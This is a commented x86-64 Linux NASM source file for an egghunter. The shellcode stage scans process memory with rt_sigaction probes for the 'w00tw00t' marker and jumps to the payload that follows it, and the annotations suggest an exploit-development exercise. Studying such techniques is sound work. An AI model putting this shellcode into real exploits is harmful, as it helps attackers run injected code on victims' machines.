; egghunter.nasm
; Author: Alex

global _start

section .text ; stores the main program code

_start:

    xor rdi, rdi    ; zero out RDI - 1st parameter for rt_sigaction
    mov rsi, rdi    ; zero out RSI - 2nd parameter for rt_sigaction
    mov rdx, rsi    ; zero out RDX - 3rd parameter for rt_sigaction
    mov r10, rdx    ; zero out R10 - 4th parameter for rt_sigaction
    mov r10b, 8     ; move the value 8 into the "size_t sigsetsize" 4th parameter which is assigned to the R10B single byte register

page_alignment:

    or si, 0xfff             ; perform a page alignment operation on the current pointer (SI) that is being validated

next_valid_address:

    inc rsi                  ; increment RSI by 1 to point to the next memory address within the current page
    jnz address_not_null     ; if RSI is not '0x00000000', continue with the egg hunting process
    inc rsi                  ; otherwise, increment RSI by 1 to avoid its value being set to '0x00000000' and only then continue with the egg hunting process

address_not_null:
    push byte +0x0D          ; push the 'rt_sigaction' syscall number 13 (0x0D in HEX) onto the stack
    pop rax                  ; pop the pushed 0x0D value from the stack into RAX, RAX is the register that needs to contain this value
    syscall                  ; issue the 'rt_sigaction' syscall
    cmp al, 0xf2             ; the low byte of RAX (it now holds the return value from the system call) is compared against 0xf2 which represents the low byte of the EFAULT return value
    jz page_alignment        ; if the ZF flag is set, increment the current pointer to the next page
    mov eax, 0x77303074      ; Otherwise, move the egg 'w00t' to EAX
    mov rdi, rsi             ; Move the memory address potentially containing our egg to RDI
    scasd                    ; Look for the 'w00t' value (stored in EAX) with RDI, RDI is then incremented by 4 bytes
    jnz next_valid_address   ; if no 'w00t' is found, move to the next memory address
    scasd                    ; 'w00t' is found, can we find the second 'w00t' in the next 4 bytes?
    jnz next_valid_address   ; if not, move to the next memory address
    jmp rdi                  ; otherwise, the egg is found, move RDI by 4 bytes and jump to our payload (it's placed right after the first 8 bytes of 'w00tw00t')
